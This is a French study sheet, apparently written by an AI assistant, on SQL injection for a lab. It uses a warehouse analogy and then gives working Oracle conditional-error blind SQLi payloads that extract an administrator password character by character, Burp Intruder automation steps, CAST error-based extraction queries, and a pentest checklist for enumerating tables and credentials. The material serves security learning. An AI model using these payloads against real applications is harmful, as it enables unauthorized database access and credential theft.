
# 🏬 Analogie globale (entrepôt)

Imagine :

- 📦 **entrepôt** → base de données
    
- 👨‍🔧 **magasinier** → moteur SQL
    
- 🧾 **formulaire de demande** → requête SQL
    
- 🪟 **fenêtre du bureau** → page web
    

Normalement tu demandes :

donne-moi le produit numéro 5

Mais si le formulaire est mal sécurisé, tu peux **modifier les instructions**.

C’est une **SQL Injection**.

---

# 🧠 Types de réponses possibles

|technique|analogie|
|---|---|
|SQLi classique|le magasinier montre directement les produits|
|UNION SQLi|le magasinier mélange deux listes|
|Blind SQLi|le magasinier répond seulement oui/non|
|Error-based|une étagère tombe si la réponse est vraie|
|Time-based|le magasinier attend avant de répondre|
|CAST error|le magasinier essaie de lire une étiquette impossible|

---

# ⚙️ Contexte Oracle

Oracle nécessite :

FROM dual

Erreur utilisée :

TO_CHAR(1/0)

car :

1/0 → division par zéro → erreur SQL

---

# 🚀 Méthode rapide (lab)

## 1️⃣ Vérifier la faille

Payload :

'||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Résultat :

erreur SQL

Test inverse :

'||(SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Résultat :

pas d'erreur

SQLi confirmée.

---

# 2️⃣ Vérifier l'utilisateur

'||(SELECT CASE WHEN(username='administrator')  
THEN TO_CHAR(1/0)  
ELSE '' END  
FROM users WHERE ROWNUM=1)||'

Si erreur :

administrator existe

---

# 3️⃣ Trouver la longueur

'||(SELECT CASE WHEN(LENGTH(password)=20)  
THEN TO_CHAR(1/0)  
ELSE '' END  
FROM users WHERE username='administrator' AND ROWNUM=1)||'

Dans ce lab :

password = 20 caractères

---

# 4️⃣ Extraire les caractères

SUBSTR(password,1,1)

Payload :

'||(SELECT CASE WHEN(SUBSTR(password,1,1)='a')  
THEN TO_CHAR(1/0)  
ELSE '' END  
FROM users WHERE username='administrator')||'

Si erreur :

caractère correct

---

# ⚙️ Automatisation Intruder

Position :

SUBSTR(password,1,1)='§a§'

Payload list :

abcdefghijklmnopqrstuvwxyz0123456789

Résultat attendu :

HTTP 500 → caractère correct

---

# 🧠 Logique blind SQLi

La base devient une **machine oui/non**.

password[1] = a ?  
password[1] = b ?  
password[1] = c ?

Réponse :

erreur SQL  
ou  
pas erreur

---

# ⚠️ Technique supplémentaire : CAST Error-Based

## Principe

Certaines bases affichent **la valeur qui provoque l’erreur**.

On peut exploiter cela avec :

CAST()

---

# Exemple

CAST((SELECT username FROM users LIMIT 1) AS int)

Si la valeur est :

administrator

Erreur :

invalid input syntax for integer: "administrator"

La donnée apparaît **dans le message d’erreur**.

---

# Extraction de données

CAST((SELECT password FROM users WHERE username='administrator') AS int)

Erreur :

invalid input syntax for integer: "abc123xyz"

Mot de passe récupéré.

---

# 🏬 Analogie CAST

Dans l’entrepôt :

Le magasinier essaie de **lire une étiquette comme un nombre**.

Mais l’étiquette contient :

administrator

Le magasinier crie :

ERREUR : "administrator" n'est pas un nombre !

En voulant signaler l’erreur, il **révèle l'information**.

---

# ⚡ Avantage

|technique|vitesse|
|---|---|
|CAST error|très rapide|
|Blind SQLi|lent|

Car :

les données apparaissent directement dans l'erreur

---

# 🔎 Méthodologie en situation réelle

Dans un vrai pentest :

---

## 1️⃣ Identifier une SQLi

Tests :

'  
''  
--  
AND 1=1  
AND 1=2

---

## 2️⃣ Identifier la base

Tests typiques :

|DB|test|
|---|---|
|MySQL|@@version|
|PostgreSQL|version()|
|Oracle|FROM dual|
|MSSQL|@@version|

---

## 3️⃣ Identifier les tables

Exemple Oracle :

SELECT table_name FROM all_tables

---

## 4️⃣ Identifier les colonnes

SELECT column_name FROM all_tab_columns

---

## 5️⃣ Extraire les données

- username
    
- password
    
- email
    
- token
    

---

# 🧰 Outils utilisés

Burp Suite :

Proxy  
Repeater  
Intruder

Intruder :

Sniper attack

---

# ⚠️ Pièges rencontrés

- `;` mal placé dans le cookie
    
- plusieurs positions Intruder
    
- requête retournant plusieurs lignes
    
- `ROWNUM=1`
    
- syntaxe Oracle `dual`
    

---

# 📌 Points clés

SQLi repose sur :

manipulation de la requête SQL finale

Signaux exploitables :

|technique|signal|
|---|---|
|Union|données visibles|
|Error-based|message d'erreur|
|Blind|changement logique|
|Time-based|délai|

---

# 🧠 Mentalité pentester

Toujours imaginer :

la requête SQL finale exécutée par le serveur

et manipuler cette logique pour obtenir :

erreur  
temps  
ou changement de réponse

---

Si tu veux, je peux aussi te faire **une deuxième fiche Obsidian très importante : "**